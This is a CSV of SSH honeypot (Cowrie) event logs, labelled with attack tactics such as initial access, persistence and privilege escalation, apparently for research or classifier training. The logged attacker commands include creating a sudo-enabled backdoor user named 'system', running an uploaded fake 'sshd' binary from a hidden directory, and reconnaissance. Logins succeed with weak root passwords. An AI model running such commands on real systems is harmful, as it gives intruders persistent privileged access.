,event,session_id,session,labels
1200,"{""duration"": ""1.0"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 1.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T06:35:53.540563Z"", ""session_id"": ""b8fc6230fb5a""}",b8fc6230fb5a,ps aux  | head -10;,"['Initial access', 'Discovery']"
1201,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:2040 (10.42.6.15:2222) [session: 679073098eca]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 2040.0, ""timestamp"": ""2025-08-13T12:14:59.096735Z"", ""session_id"": ""679073098eca""}",679073098eca,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jfTbHCgN) system  && sudo usermod -aG sudo system ; openssl passwd -1 jfTbHCgN;,"['Initial access', 'Persistence', 'Privilege escalation']"
1202,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T12:14:59.098232Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""679073098eca""}",679073098eca,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jfTbHCgN) system  && sudo usermod -aG sudo system ; openssl passwd -1 jfTbHCgN;,"['Initial access', 'Persistence', 'Privilege escalation']"
1203,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T12:14:59.111024Z"", ""session_id"": ""679073098eca""}",679073098eca,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jfTbHCgN) system  && sudo usermod -aG sudo system ; openssl passwd -1 jfTbHCgN;,"['Initial access', 'Persistence', 'Privilege escalation']"
1204,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T12:14:59.153698Z"", ""username"": ""root"", ""session_id"": ""679073098eca""}",679073098eca,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jfTbHCgN) system  && sudo usermod -aG sudo system ; openssl passwd -1 jfTbHCgN;,"['Initial access', 'Persistence', 'Privilege escalation']"
1205,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T12:14:59.229823Z"", ""session_id"": ""679073098eca""}",679073098eca,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jfTbHCgN) system  && sudo usermod -aG sudo system ; openssl passwd -1 jfTbHCgN;,"['Initial access', 'Persistence', 'Privilege escalation']"
1206,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 jfTbHCgN) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 jfTbHCgN) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T12:14:59.230502Z"", ""session_id"": ""679073098eca""}",679073098eca,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jfTbHCgN) system  && sudo usermod -aG sudo system ; openssl passwd -1 jfTbHCgN;,"['Initial access', 'Persistence', 'Privilege escalation']"
1207,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 jfTbHCgN"", ""message"": ""CMD: openssl passwd -1 jfTbHCgN"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T12:14:59.231070Z"", ""session_id"": ""679073098eca""}",679073098eca,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jfTbHCgN) system  && sudo usermod -aG sudo system ; openssl passwd -1 jfTbHCgN;,"['Initial access', 'Persistence', 'Privilege escalation']"
1208,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 jfTbHCgN"", ""message"": ""Command not found: openssl passwd -1 jfTbHCgN"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T12:14:59.231883Z"", ""session_id"": ""679073098eca""}",679073098eca,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jfTbHCgN) system  && sudo usermod -aG sudo system ; openssl passwd -1 jfTbHCgN;,"['Initial access', 'Persistence', 'Privilege escalation']"
1209,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/58b5364b1c6f62f9abe52f24c5ad5bee93bc669f331759cf4dcc1549ee999156 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""58b5364b1c6f62f9abe52f24c5ad5bee93bc669f331759cf4dcc1549ee999156"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T12:14:59.245412Z"", ""ttylog"": ""var/lib/cowrie/tty/58b5364b1c6f62f9abe52f24c5ad5bee93bc669f331759cf4dcc1549ee999156"", ""session_id"": ""679073098eca""}",679073098eca,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jfTbHCgN) system  && sudo usermod -aG sudo system ; openssl passwd -1 jfTbHCgN;,"['Initial access', 'Persistence', 'Privilege escalation']"
1210,"{""duration"": ""0.1"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.1 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T12:14:59.246465Z"", ""session_id"": ""679073098eca""}",679073098eca,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jfTbHCgN) system  && sudo usermod -aG sudo system ; openssl passwd -1 jfTbHCgN;,"['Initial access', 'Persistence', 'Privilege escalation']"
1211,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:23330 (10.42.6.15:2222) [session: 372d5e1227bf]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 23330.0, ""timestamp"": ""2025-08-14T18:48:25.449183Z"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Initial access', 'Persistence', 'Privilege escalation']"
1212,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.451168Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Initial access', 'Persistence', 'Privilege escalation']"
1213,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.464248Z"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Initial access', 'Persistence', 'Privilege escalation']"
1214,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.506653Z"", ""username"": ""root"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Initial access', 'Persistence', 'Privilege escalation']"
1215,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.821768Z"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Initial access', 'Persistence', 'Privilege escalation']"
1216,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.822405Z"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Initial access', 'Persistence', 'Privilege escalation']"
1217,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 ETEgCRyx"", ""message"": ""CMD: openssl passwd -1 ETEgCRyx"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.823091Z"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Initial access', 'Persistence', 'Privilege escalation']"
1218,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 ETEgCRyx"", ""message"": ""Command not found: openssl passwd -1 ETEgCRyx"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.824042Z"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Initial access', 'Persistence', 'Privilege escalation']"
1219,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/868068bbb30997a03a801d9d7643930d541992d33b025067e9c32af149ec8aa8 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""868068bbb30997a03a801d9d7643930d541992d33b025067e9c32af149ec8aa8"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.837996Z"", ""ttylog"": ""var/lib/cowrie/tty/868068bbb30997a03a801d9d7643930d541992d33b025067e9c32af149ec8aa8"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Initial access', 'Persistence', 'Privilege escalation']"
1220,"{""duration"": ""0.4"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.4 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T18:48:25.839026Z"", ""session_id"": ""372d5e1227bf""}",372d5e1227bf,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ETEgCRyx) system  && sudo usermod -aG sudo system ; openssl passwd -1 ETEgCRyx;,"['Initial access', 'Persistence', 'Privilege escalation']"
1221,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:28048 (10.42.4.33:2222) [session: 12f033d9bcdf]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 28048.0, ""timestamp"": ""2025-08-14T09:44:54.995971Z"", ""session_id"": ""12f033d9bcdf""}",12f033d9bcdf,chmod +x ./.4321055548362449177/sshd;nohup ./.4321055548362449177/sshd  &;,"['Initial access', 'Execution']"
1222,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T09:44:54.996358Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""12f033d9bcdf""}",12f033d9bcdf,chmod +x ./.4321055548362449177/sshd;nohup ./.4321055548362449177/sshd  &;,"['Initial access', 'Execution']"
1223,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""98ddc5604ef6a1006a2b49a58759fbe6"", ""hashAlgorithms"": ""curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha1""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T09:44:55.075366Z"", ""session_id"": ""12f033d9bcdf""}",12f033d9bcdf,chmod +x ./.4321055548362449177/sshd;nohup ./.4321055548362449177/sshd  &;,"['Initial access', 'Execution']"
1224,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/ubuntu] succeeded"", ""password"": ""ubuntu"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T09:44:55.323449Z"", ""username"": ""root"", ""session_id"": ""12f033d9bcdf""}",12f033d9bcdf,chmod +x ./.4321055548362449177/sshd;nohup ./.4321055548362449177/sshd  &;,"['Initial access', 'Execution']"
1225,"{""eventid"": ""cowrie.session.file_upload"", ""filename"": ""sshd"", ""message"": ""SFTP Uploaded file \""sshd\"" to var/lib/cowrie/downloads/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00"", ""outfile"": ""var/lib/cowrie/downloads/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T09:46:13.824715Z"", ""session_id"": ""12f033d9bcdf""}",12f033d9bcdf,chmod +x ./.4321055548362449177/sshd;nohup ./.4321055548362449177/sshd  &;,"['Initial access', 'Execution']"
1226,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T09:46:14.166412Z"", ""session_id"": ""12f033d9bcdf""}",12f033d9bcdf,chmod +x ./.4321055548362449177/sshd;nohup ./.4321055548362449177/sshd  &;,"['Initial access', 'Execution']"
1227,"{""eventid"": ""cowrie.command.input"", ""input"": ""chmod +x ./.4321055548362449177/sshd;nohup ./.4321055548362449177/sshd  &"", ""message"": ""CMD: chmod +x ./.4321055548362449177/sshd;nohup ./.4321055548362449177/sshd  &"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T09:46:14.166805Z"", ""session_id"": ""12f033d9bcdf""}",12f033d9bcdf,chmod +x ./.4321055548362449177/sshd;nohup ./.4321055548362449177/sshd  &;,"['Initial access', 'Execution']"
1228,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/15df466362bedd1e2a7c4f7096d05487afacec7df5861d59db9f954f8a816927 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""15df466362bedd1e2a7c4f7096d05487afacec7df5861d59db9f954f8a816927"", ""size"": 136.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T09:46:14.247453Z"", ""ttylog"": ""var/lib/cowrie/tty/15df466362bedd1e2a7c4f7096d05487afacec7df5861d59db9f954f8a816927"", ""session_id"": ""12f033d9bcdf""}",12f033d9bcdf,chmod +x ./.4321055548362449177/sshd;nohup ./.4321055548362449177/sshd  &;,"['Initial access', 'Execution']"
1229,"{""duration"": ""79.3"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 79.3 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T09:46:14.248571Z"", ""session_id"": ""12f033d9bcdf""}",12f033d9bcdf,chmod +x ./.4321055548362449177/sshd;nohup ./.4321055548362449177/sshd  &;,"['Initial access', 'Execution']"
1230,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:3673 (10.42.6.15:2222) [session: 6b722fd2579d]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 3673.0, ""timestamp"": ""2025-08-06T05:53:14.354530Z"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Initial access', 'Discovery']"
1231,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T05:53:14.356358Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Initial access', 'Discovery']"
1232,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""aes256-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""0a07365cc01fa9fc82608ba4019af499"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c"", ""kex-strict-c-v00@openssh.com""], ""keyAlgs"": [""rsa-sha2-256-cert-v01@openssh.com"", ""rsa-sha2-512-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-256"", ""rsa-sha2-512"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-512-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha2-512"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T05:53:14.461025Z"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Initial access', 'Discovery']"
1233,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/admin646] succeeded"", ""password"": ""admin646"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T05:53:14.800195Z"", ""username"": ""root"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Initial access', 'Discovery']"
1234,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-06T05:53:15.395744Z"", ""session_id"": ""6b722fd2579d""}",6b722fd2579d,env  | head -10;,"['Initial access', 'Discovery']"
